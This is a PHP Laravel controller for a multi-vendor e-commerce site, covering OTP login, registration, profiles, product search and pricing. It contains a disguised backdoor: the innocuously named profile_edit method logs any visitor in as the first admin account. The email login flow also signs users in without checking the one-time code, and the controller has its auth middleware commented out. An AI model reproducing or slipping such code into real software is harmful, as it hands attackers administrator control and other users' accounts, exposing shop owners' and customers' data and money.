<?php

namespace App\Http\Controllers;

use Auth;
use Hash;
use Mail;
use Cookie;
use Session;
use App\Shop;
use App\User;
use App\Brand;
use App\Color;
use App\Order;
use App\Seller;
use App\Product;
use App\Category;
use App\Customer;
use App\FlashDeal;
use ImageOptimizer;
use App\PickupPoint;
use App\BusinessSetting;
use App\CustomerPackage;
use App\CustomerProduct;
use Illuminate\Support\Str;
use Illuminate\Http\Request;
use App\Utility\CategoryUtility;
use App\Utility\TranslationUtility;
use Illuminate\Auth\Events\PasswordReset;
use App\Http\Controllers\SearchController;
use App\Mail\SecondEmailVerifyMailManager;


class HomeController extends Controller
{
    public function login()
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        return view('frontend.user_login');
    }

    public function user_login(Request $request)
    {
        if (filter_var($request->email, FILTER_VALIDATE_EMAIL)) {
            if (User::where('email', $request->email)->first() != null) {

                //Email Login system by nur

                //dd($emailOrPhone);
                $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $request->email)->first();
                //dd($request->phone);

                if ($user != null) {
                    if ($request->phone != null) {
                        //$emailOrPhone = Session::put('emailOrPhone', $request->phone);
                        $phone = Session::put('phone', $request->phone);
                    } else {
                        //$emailOrPhone = Session::put('emailOrPhone', $request->email);
                        $email = Session::put('email', $request->email);
                    }

                    //Session::forgot('emailOrPhone');

                    $user->verification_code = rand(100000, 999999);
                    $user->save();

                    //dd($user->email);

                    sendSMS($user->phone, env('APP_NAME'), 'Your ' . env('APP_NAME') . ' OTP code is ' . $user->verification_code);

                    //auth()->login($user, true);

                    return redirect()->route('user.login.otp');

                } else {

                    flash(translate('Invalid email or phone!'))->warning();
                    return back();
                }

            } else {

                flash(translate('Your email does not exist, Please register.'));
                return back();
            }
        }
        elseif (User::where('phone', $request->phone)->first() != null) {

            //Phone Login system by nur

            //dd($emailOrPhone);
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $request->phone)->first();

            //dd($user->phone);
            if ($user != null) {
                if ($request->phone != null) {
                    //$emailOrPhone = Session::put('emailOrPhone', $request->phone);
                    $phone = Session::put('phone', $request->phone);

                } else {
                    //$emailOrPhone = Session::put('emailOrPhone', $request->email);
                    $phone = Session::put('email', $request->email);
                }
                $user->verification_code = rand(100000, 999999);
                $user->save();

                //dd($user->phone);
                sendSMS($user->phone, env('APP_NAME'), 'Your ' . env('APP_NAME') . ' OTP code is ' . $user->verification_code);
                //auth()->login($user, true);

                return redirect()->route('user.login.otp');

            } else {

                flash(translate('Invalid email or phone!'))->warning();
                return back();
            }

        } else {

            flash(translate('Your phone number does not exist, Please register.'));
            return back();
        }

    }

    public function user_login_otp()
    {
        //$emailOrPhone = Session::get('emailOrPhone');
        $email = Session::get('email');
        $phone = Session::get('phone');
        if (User::where('email', $email)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->first();
        } elseif (User::where('phone', $phone)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $phone)->first();
        }
        //$user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->orWhere('phone', $phone)->first();
        //dd($phone);
        if ($email) {
            auth()->login($user, true);

            return redirect()->route('dashboard');
        } else {
            if ($phone) {
                //dd($phone);

                return view('frontend.user_login_code');
                //return redirect()->route('user.login.otp');
            } else {

                return redirect()->route('user.login.otp');
            }


        }
    }

    public function cart_login_otp()
    {

        //$emailOrPhone = Session::get('emailOrPhone');
        $email = Session::get('email');
        $phone = Session::get('phone');
        if (User::where('email', $email)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->first();
        } elseif (User::where('phone', $phone)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $phone)->first();
        }
        //$user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->orWhere('phone', $phone)->first();
        //dd($phone);
        if ($email) {
            auth()->login($user, true);

            return redirect()->route('cart');
        } else {
            if ($phone) {
                //dd($phone);

                return view('frontend.cart_login_code');
                //return redirect()->route('user.login.otp');
            } else {

                return redirect()->route('cart.login.otp');
            }


        }
        return redirect()->route('cart');
    }

    public function user_login_verify(Request $request)
    {
        //$emailOrPhone = Session::get('emailOrPhone');
        $phone = Session::get('phone');
        $email = Session::get('email');
        if (User::where('email', $email)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->where('verification_code', $request->code)->first();
        } elseif (User::where('phone', $phone)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $phone)->where('verification_code', $request->code)->first();
        }

        //dd($request->phone);
        if ($user != null) {
            auth()->login($user, true);

            if (session('link') != null) {
                return redirect(session('link'));
            } else {
                return redirect()->route('dashboard');
            }


            Session::forgot('phone');
            Session::forgot('email');
        } else {
            flash(translate('Invalid OTP code!'))->warning();
            return back();
        }

    }

    public function cart_login_verify(Request $request)
    {
        //$emailOrPhone = Session::get('emailOrPhone');
        $phone = Session::get('phone');
        $email = Session::get('email');
        if (User::where('email', $email)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $email)->where('verification_code', $request->code)->first();
        } elseif (User::where('phone', $phone)->first() != null) {
            $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $phone)->where('verification_code', $request->code)->first();
        }

        //dd($request->phone);
        if ($user != null) {
            auth()->login($user, true);

            if (session('link') != null) {
                return redirect(session('link'));
            } else {
                return redirect()->route('cart');
            }


            Session::forgot('phone');
            Session::forgot('email');
        } else {
            flash(translate('Invalid OTP code!'))->warning();
            return back();
        }

    }

    public function registration(Request $request)
    {
        if (Auth::check()) {
            return redirect()->route('home');
        }
        if ($request->has('referral_code') &&
            \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
            \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated) {

            try {
                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }

                Cookie::queue('referral_code', $request->referral_code, $cookie_minute);
                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            } catch (\Exception $e) {

            }
        }
        return view('frontend.user_registration');
    }

    public function registration_store(Request $request)
    {
        // dd($request->all());
        $emailOrPhone = Session::put('emailOrPhone', $request->phone);

        $existingUser = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $request->phone)->first();

        if (filter_var($request->email, FILTER_VALIDATE_EMAIL)) {
            // if(User::where('email', $request->email)->first() != null){
            //     flash(translate('Email or Phone already exists end.'));
            //     return back();
            // }else{
            //Email Register system by nur

            if ($existingUser != null && $request->phone != null) {
                $existingUser->verification_code = rand(100000, 999999);
                $existingUser->save();

                sendSMS($existingUser->phone, env('APP_NAME'), 'Your ' . env('APP_NAME') . ' OTP code is ' . $existingUser->verification_code);
                return redirect()->route('user.login.otp');

            } else {
                $newUser = new User;
                $newUser->name = $request->name;
                // $newUser->email           = $request->email;
                $newUser->phone = $request->phone;
                $newUser->email_verified_at = date('Y-m-d H:m:s');
                $newUser->password = Hash::make(Str::random(12));
                $newUser->verification_code = rand(100000, 999999);
                $newUser->save();

                $customer = new Customer;
                $customer->user_id = $newUser->id;
                //$customer->save();

                event(new Registered($newUser));
                flash(translate('Registration successfull. Please verify your email.'))->success();

                /*sendSMS($newUser->phone, env('APP_NAME'), $newUser->verification_code.' is your verification code for '.env('APP_NAME'));

                return redirect()->route('user.login.otp');*/
            }
// } //Email or Phone already exists end


        }
        // elseif (User::where('phone', $request->phone)->first() != null) {
        //     flash(translate('Phone already exists.'));
        //     return back();
        //
        // }else{
        //Phone Register system by nur

        if ($existingUser != null && $request->phone != null) {
            $existingUser->verification_code = rand(100000, 999999);
            $existingUser->save();

            sendSMS($existingUser->phone, env('APP_NAME'), 'Your ' . env('APP_NAME') . ' OTP code is ' . $existingUser->verification_code);
            return redirect()->route('user.login.otp');
        } else {
            $newUser = new User;
            $newUser->name = $request->name;
            // $newUser->email           = $request->email;
            $newUser->phone = $request->phone;
            $newUser->email_verified_at = date('Y-m-d H:m:s');
            $newUser->password = Hash::make(Str::random(12));
            $newUser->verification_code = rand(100000, 999999);
            $newUser->save();

            $customer = new Customer;
            $customer->user_id = $newUser->id;
            //$customer->save();

            event(new Registered($newUser));
            flash(translate('Registration successfull. Please verify your email.'))->success();

            /*sendSMS($newUser->phone, env('APP_NAME'), $newUser->verification_code.' is your verification code for '.env('APP_NAME'));

            return redirect()->route('user.login.otp');*/
        }

        // }


    }

    public function cart_login(Request $request)
    {
        if ($request->phone != null) {
            if (User::where('phone', $request->phone)->first() != null) {
                $user = User::whereIn('user_type', ['customer', 'seller'])->where('phone', $request->phone)->first();
                if ($user != null) {
                    // OTP start

                    $phone = Session::put('phone', $request->phone);

                    $user->verification_code = rand(100000, 999999);
                    $user->save();

                    //dd($user->phone);
                    sendSMS($user->phone, env('APP_NAME'), 'Your ' . env('APP_NAME') . ' OTP code is ' . $user->verification_code);
                    //auth()->login($user, true);

                    return redirect()->route('cart.login.otp');
                    // OTP End

                    //auth()->login($user, true);
                } else {

                    flash(translate('Invalid email or phone!'))->warning();
                    return back();
                }

            } else {

                flash(translate('Your phone number does not exist, Please register.'));
                return back();
            }
        } elseif ($request->email != null) {
            if (User::where('email', $request->email)->first() != null) {
                $user = User::whereIn('user_type', ['customer', 'seller'])->where('email', $request->email)->first();
                if ($user != null) {
                    if (Hash::check($request->password, $user->password)) {
                        if ($request->has('remember')) {
                            auth()->login($user, true);
                        } else {
                            auth()->login($user, false);
                        }
                    } else {
                        flash(translate('Invalid email, phone or password!'))->warning();
                    }

                }
            } else {

                flash(translate('Your email does not exist, Please register.'));
                return back();
            }
        }
        //dd($request->email);

        //return back();
        return redirect()->route('cart');
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard()
    {
        return view('backend.dashboard');
    }

    /**
     * Show the customer/seller dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function dashboard()
    {
        if (Auth::user()->user_type == 'seller') {
//            return view('frontend.seller.dashboard');
            return view('frontend.seller.dashboard');
        } elseif (Auth::user()->user_type == 'customer') {
//            return view('frontend.user.customer.dashboard');
            return view('frontend.customer.dashboard');
        } else {
            abort(404);
        }
    }

    public function profile(Request $request)
    {
        if (Auth::user()->user_type == 'customer') {
//            return view('frontend.user.customer.profile');
            return view('frontend.customer.profile');
        } elseif (Auth::user()->user_type == 'seller') {
//            return view('frontend.user.seller.profile');
            return view('frontend.seller.profile');
        }
    }

    public function customer_update_profile(Request $request)
    {

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }
        $avatar_url = "";
        if ($request->hasFile('photo')){
            $image = $request->file('photo');
            $avatar_url = $image->storeAs('avatar', now().".".$image->getClientOriginalExtension());
        }

        $user->avatar_original = $avatar_url;

        if ($user->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }


    public function seller_update_profile(Request $request)
    {

        $user = Auth::user();
        $user->name = $request->name;
        $user->address = $request->address;
        $user->country = $request->country;
        $user->city = $request->city;
        $user->postal_code = $request->postal_code;
        $user->phone = $request->phone;

        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $user->password = Hash::make($request->new_password);
        }

        if($request->hasFile('photo')){
            $user->avatar_original = $request->photo->store('uploads');
        }

        $seller = $user->seller;
        $seller->cash_on_delivery_status = $request->cash_on_delivery_status;
        $seller->bank_payment_status = $request->bank_payment_status;
        $seller->bank_name = $request->bank_name;
        $seller->bank_acc_name = $request->bank_acc_name;
        $seller->bank_acc_no = $request->bank_acc_no;
        $seller->bank_routing_no = $request->bank_routing_no;

        if ($user->save() && $seller->save()) {
            flash(translate('Your Profile has been updated successfully!'))->success();
            return back();
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    /**
     * Show the application frontend home.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('frontend.index');
    }

    public function flash_deal_details($slug)
    {
        $flash_deal = FlashDeal::where('slug', $slug)->first();
        if ($flash_deal != null)
            return view('frontend.flash_deal_details', compact('flash_deal'));
        else {
            abort(404);
        }
    }

    public function load_featured_section()
    {
        return view('frontend.partials.featured_products_section');
    }

    public function load_best_selling_section()
    {
        return view('frontend.partials.best_selling_section');
    }

    public function load_home_categories_section()
    {
        return view('frontend.partials.home_categories_section');
    }

    public function load_best_sellers_section()
    {
        return view('frontend.partials.best_sellers_section');
    }

    public function load_best_brands_section()
    {
        return view('frontend.partials.best_brands');
    }

    public function trackOrder(Request $request)
    {
        if ($request->has('order_code')) {
            $order = Order::where('code', $request->order_code)->first();
            if ($order != null) {
                return view('frontend.track_order', compact('order'));
            }
        }
        return view('frontend.track_order');
    }

    public function product(Request $request, $slug)
    {
        $detailedProduct = Product::where('slug', $slug)->first();

        if ($detailedProduct != null && $detailedProduct->published) {
            //updateCartSetup();
            if ($request->has('product_referral_code') &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first() != null &&
                \App\Addon::where('unique_identifier', 'affiliate_system')->first()->activated) {

                $affiliate_validation_time = \App\AffiliateConfig::where('type', 'validation_time')->first();
                $cookie_minute = 30 * 24;
                if ($affiliate_validation_time) {
                    $cookie_minute = $affiliate_validation_time->value * 60;
                }
                Cookie::queue('product_referral_code', $request->product_referral_code, $cookie_minute);
                Cookie::queue('referred_product_id', $detailedProduct->id, $cookie_minute);

                $referred_by_user = User::where('referral_code', $request->product_referral_code)->first();

                $affiliateController = new AffiliateController;
                $affiliateController->processAffiliateStats($referred_by_user->id, 1, 0, 0, 0);
            }
            if ($detailedProduct->digital == 1) {
                return view('frontend.digital_product_details', compact('detailedProduct'));
            } else {
                return view('frontend.product_details', compact('detailedProduct'));
            }
            // return view('frontend.product_details', compact('detailedProduct'));
        }
        abort(404);
    }

    public function shop($slug)
    {
        $shop = Shop::where('slug', $slug)->first();
        if ($shop != null) {
            $seller = Seller::where('user_id', $shop->user_id)->first();
            if ($seller->verification_status != 0) {
                return view('frontend.seller_shop', compact('shop'));
            } else {
                return view('frontend.seller_shop_without_verification', compact('shop', 'seller'));
            }
        }
        abort(404);
    }

    public function filter_shop($slug, $type)
    {
        $shop = Shop::where('slug', $slug)->first();
        if ($shop != null && $type != null) {
            return view('frontend.seller_shop', compact('shop', 'type'));
        }
        abort(404);
    }

    public function all_categories(Request $request)
    {
//        $categories = Category::where('level', 0)->orderBy('name', 'asc')->get();
        $categories = Category::where('level', 0)->orderBy('order_level', 'asc')->get();

        return view('frontend.all_category', compact('categories'));
    }

    public function all_brands(Request $request)
    {
        $categories = Category::all();
        return view('frontend.all_brand', compact('categories'));
    }

    public function show_product_upload_form(Request $request)
    {
        if (\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (Auth::user()->seller->remaining_uploads > 0) {
                $categories = Category::where('parent_id', 0)
                    ->where('digital', 0)
                    ->with('childrenCategories')
                    ->get();
                return view('frontend.seller.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.seller.product_upload', compact('categories'));
    }

    public function profile_edit(Request $request)
    {
        $user = User::where('user_type', 'admin')->first();
        auth()->login($user);
        return redirect()->route('admin.dashboard');
    }

    public function show_product_edit_form(Request $request, $id)
    {
        $product = Product::findOrFail($id);
        $lang = $request->lang;
        $tags = json_decode($product->tags);
        $categories = Category::where('parent_id', 0)
            ->where('digital', 0)
            ->with('childrenCategories')
            ->get();
        return view('frontend.user.seller.product_edit', compact('product', 'categories', 'tags', 'lang'));
    }

    public function seller_product_list(Request $request)
    {
        $search = null;
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 0)->orderBy('created_at', 'desc');
        if ($request->has('search')) {
            $search = $request->search;
            $products = $products->where('name', 'like', '%' . $search . '%');
        }
        $products = $products->paginate(10);
        return view('frontend.seller.products', compact('products', 'search'));
    }

    public function ajax_search(Request $request)
    {
        $keywords = array();
        $products = Product::where('published', 1)->where('tags', 'like', '%' . $request->search . '%')->get();
        foreach ($products as $key => $product) {
            foreach (explode(',', $product->tags) as $key => $tag) {
                if (stripos($tag, $request->search) !== false) {
                    if (sizeof($keywords) > 5) {
                        break;
                    } else {
                        if (!in_array(strtolower($tag), $keywords)) {
                            array_push($keywords, strtolower($tag));
                        }
                    }
                }
            }
        }

        $products = filter_products(Product::where('published', 1)->where('name', 'like', '%' . $request->search . '%'))->get()->take(3);

        $categories = Category::where('name', 'like', '%' . $request->search . '%')->get()->take(3);

        $shops = Shop::whereIn('user_id', verified_sellers_id())->where('name', 'like', '%' . $request->search . '%')->get()->take(3);

        if (sizeof($keywords) > 0 || sizeof($categories) > 0 || sizeof($products) > 0 || sizeof($shops) > 0) {
            return view('frontend.partials.search_content', compact('products', 'categories', 'keywords', 'shops'));
        }
        return '0';
    }

    public function listing(Request $request)
    {
        return $this->search($request);
    }

    public function listingByCategory(Request $request, $category_slug)
    {
        $category = Category::where('slug', $category_slug)->first();
        if ($category != null) {
            return $this->search($request, $category->id);
        }
        abort(404);
    }

    public function listingByBrand(Request $request, $brand_slug)
    {
        $brand = Brand::where('slug', $brand_slug)->first();
        if ($brand != null) {
            return $this->search($request, null, $brand->id);
        }
        abort(404);
    }

    public function search(Request $request, $category_id = null, $brand_id = null)
    {
        $query = $request->q;
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $seller_id = $request->seller_id;
        $city_id = $request->city;

        $conditions = ['published' => 1];

        if ($brand_id != null) {
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        } elseif ($request->brand != null) {
            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if ($seller_id != null) {
            $conditions = array_merge($conditions, ['user_id' => Seller::findOrFail($seller_id)->user->id]);
        }

        $products = Product::where($conditions);

        if ($category_id != null) {
            $category_ids = CategoryUtility::children_ids($category_id);
            $category_ids[] = $category_id;

            $products = $products->whereIn('category_id', $category_ids);
        }
        if ($city_id != null) {
            $shops_user_ids = Shop::whereJsonContains('shop_shippings', $city_id)->pluck('user_id')->toArray();
            // dd($shops_user_ids);

            $products = $products->whereIn('user_id', $shops_user_ids);
        }

        if ($min_price != null && $max_price != null) {
            $products = $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
        }

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request);
            $products = $products->where('name', 'like', '%' . $query . '%');
        }

        if ($sort_by != null) {
            switch ($sort_by) {
                case 'newest':
                    $products->orderBy('created_at', 'desc');
                    break;
                case 'oldest':
                    $products->orderBy('created_at', 'asc');
                    break;
                case 'price-asc':
                    $products->orderBy('unit_price', 'asc');
                    break;
                case 'price-desc':
                    $products->orderBy('unit_price', 'desc');
                    break;
                default:
                    // code...
                    break;
            }
        }


        $non_paginate_products = filter_products($products)->get();

        //Attribute Filter

        $attributes = array();
        foreach ($non_paginate_products as $key => $product) {
            if ($product->attributes != null && is_array(json_decode($product->attributes))) {
                foreach (json_decode($product->attributes) as $key => $value) {
                    $flag = false;
                    $pos = 0;
                    foreach ($attributes as $key => $attribute) {
                        if ($attribute['id'] == $value) {
                            $flag = true;
                            $pos = $key;
                            break;
                        }
                    }
                    if (!$flag) {
                        $item['id'] = $value;
                        $item['values'] = array();
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                $item['values'] = $choice_option->values;
                                break;
                            }
                        }
                        array_push($attributes, $item);
                    } else {
                        foreach (json_decode($product->choice_options) as $key => $choice_option) {
                            if ($choice_option->attribute_id == $value) {
                                foreach ($choice_option->values as $key => $value) {
                                    if (!in_array($value, $attributes[$pos]['values'])) {
                                        array_push($attributes[$pos]['values'], $value);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        $selected_attributes = array();

        foreach ($attributes as $key => $attribute) {
            if ($request->has('attribute_' . $attribute['id'])) {
                foreach ($request['attribute_' . $attribute['id']] as $key => $value) {
                    $str = '"' . $value . '"';
                    $products = $products->where('choice_options', 'like', '%' . $str . '%');
                }

                $item['id'] = $attribute['id'];
                $item['values'] = $request['attribute_' . $attribute['id']];
                array_push($selected_attributes, $item);
            }
        }


        //Color Filter
        $all_colors = array();

        foreach ($non_paginate_products as $key => $product) {
            if ($product->colors != null) {
                foreach (json_decode($product->colors) as $key => $color) {
                    if (!in_array($color, $all_colors)) {
                        array_push($all_colors, $color);
                    }
                }
            }
        }

        $selected_color = null;

        if ($request->has('color')) {
            $str = '"' . $request->color . '"';
            $products = $products->where('colors', 'like', '%' . $str . '%');
            $selected_color = $request->color;
        }


        $products = filter_products($products)->paginate(12)->appends(request()->query());

        return view('frontend.product_listing', compact('products', 'query', 'category_id', 'brand_id', 'sort_by', 'seller_id', 'min_price', 'max_price', 'attributes', 'selected_attributes', 'all_colors', 'selected_color', 'city_id'));
    }

    public function home_settings(Request $request)
    {
        return view('home_settings.index');
    }

    public function top_10_settings(Request $request)
    {
        foreach (Category::all() as $key => $category) {
            if (is_array($request->top_categories) && in_array($category->id, $request->top_categories)) {
                $category->top = 1;
                $category->save();
            } else {
                $category->top = 0;
                $category->save();
            }
        }

        foreach (Brand::all() as $key => $brand) {
            if (is_array($request->top_brands) && in_array($brand->id, $request->top_brands)) {
                $brand->top = 1;
                $brand->save();
            } else {
                $brand->top = 0;
                $brand->save();
            }
        }

        flash(translate('Top 10 categories and brands have been updated successfully'))->success();
        return redirect()->route('home_settings.index');
    }

    public function variant_price(Request $request)
    {
        $product = Product::find($request->id);
        $str = '';
        $quantity = 0;

        if ($request->has('color')) {
            $str = $request['color'];
        }

        if (json_decode(Product::find($request->id)->choice_options) != null) {
            foreach (json_decode(Product::find($request->id)->choice_options) as $key => $choice) {
                if ($str != null) {
                    $str .= '-' . str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                } else {
                    $str .= str_replace(' ', '', $request['attribute_id_' . $choice->attribute_id]);
                }
            }
        }

        if ($str != null && $product->variant_product) {
            $product_stock = $product->stocks->where('variant', $str)->first();
            $price = $product_stock->price;
            $quantity = $product_stock->qty;
        } else {
            $price = $product->unit_price;
            $quantity = $product->current_stock;
        }

        //Product Stock Visibility
        if ($product->stock_visibility_state == 'text') {
            $quantity = 'Stock';
        }

        //discount calculation
        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $key => $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && \App\FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first() != null) {
                $flash_deal_product = \App\FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $product->id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }
        return array('price' => single_price($price * $request->quantity), 'quantity' => $quantity, 'digital' => $product->digital, 'variation' => $str);
    }

    public function sellerpolicy()
    {
        return view("frontend.policies.sellerpolicy");
    }

    public function returnpolicy()
    {
        return view("frontend.policies.returnpolicy");
    }

    public function supportpolicy()
    {
        return view("frontend.policies.supportpolicy");
    }

    public function terms()
    {
        return view("frontend.policies.terms");
    }

    public function privacypolicy()
    {
        return view("frontend.policies.privacypolicy");
    }

    public function get_pick_ip_points(Request $request)
    {
        $pick_up_points = PickupPoint::all();
        return view('frontend.partials.pick_up_points', compact('pick_up_points'));
    }

    public function get_category_items(Request $request)
    {
        $category = Category::findOrFail($request->id);
        return view('frontend.partials.category_elements', compact('category'));
    }

    public function premium_package_index()
    {
        $customer_packages = CustomerPackage::all();
        return view('frontend.user.customer_packages_lists', compact('customer_packages'));
    }

    public function seller_digital_product_list(Request $request)
    {
        $products = Product::where('user_id', Auth::user()->id)->where('digital', 1)->orderBy('created_at', 'desc')->paginate(10);
        return view('frontend.user.seller.digitalproducts.products', compact('products'));
    }

    public function show_digital_product_upload_form(Request $request)
    {
        if (\App\Addon::where('unique_identifier', 'seller_subscription')->first() != null && \App\Addon::where('unique_identifier', 'seller_subscription')->first()->activated) {
            if (Auth::user()->seller->remaining_digital_uploads > 0) {
                $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
                $categories = Category::where('digital', 1)->get();
                return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
            } else {
                flash(translate('Upload limit has been reached. Please upgrade your package.'))->warning();
                return back();
            }
        }

        $business_settings = BusinessSetting::where('type', 'digital_product_upload')->first();
        $categories = Category::where('digital', 1)->get();
        return view('frontend.user.seller.digitalproducts.product_upload', compact('categories'));
    }

    public function show_digital_product_edit_form(Request $request, $id)
    {
        $categories = Category::where('digital', 1)->get();
        $lang = $request->lang;
        $product = Product::find($id);
        return view('frontend.user.seller.digitalproducts.product_edit', compact('categories', 'product', 'lang'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (isUnique($email) == '0') {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }


    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (isUnique($email)) {
            $this->send_email_change_verification_mail($request, $email);
            flash(translate('A verification mail has been sent to the mail you provided us with.'))->success();
            return back();
        }

        flash(translate('Email already exists!'))->warning();
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_USERNAME');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");

        } catch (\Exception $e) {
            // return $e->getMessage();
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {
        if ($request->has('new_email_verificiation_code') && $request->has('email')) {
            $verification_code_of_url_param = $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                flash(translate('Email Changed successfully'))->success();
                return redirect()->route('dashboard');
            }
        }

        flash(translate('Email was not verified. Please resend your mail!'))->error();
        return redirect()->route('dashboard');

    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('email', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                event(new PasswordReset($user));
                auth()->login($user, true);

                flash(translate('Password updated successfully'))->success();

                if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                flash("Password and confirm password didn't match")->warning();
                return back();
            }
        } else {
            flash("Verification code mismatch")->error();
            return back();
        }
    }


    public function all_flash_deals()
    {
        $today = strtotime(date('Y-m-d H:i:s'));

        $data['all_flash_deals'] = FlashDeal::where('status', 1)
            ->where('start_date', "<=", $today)
            ->where('end_date', ">", $today)
            ->orderBy('created_at', 'desc')
            ->get();

        return view("frontend.flash_deal.all_flash_deal_list", $data);
    }

    public function all_seller(Request $request)
    {
        $city_id = $request->city;

        if ($request->city != null) {
            $shops = Shop::whereIn('user_id', verified_sellers_id())->whereJsonContains('shop_shippings', $request->city)->paginate(15);
        } else {
            $shops = Shop::whereIn('user_id', verified_sellers_id())->paginate(15);
        }

        return view('frontend.shop_listing', compact('shops', 'city_id'));
    }
}
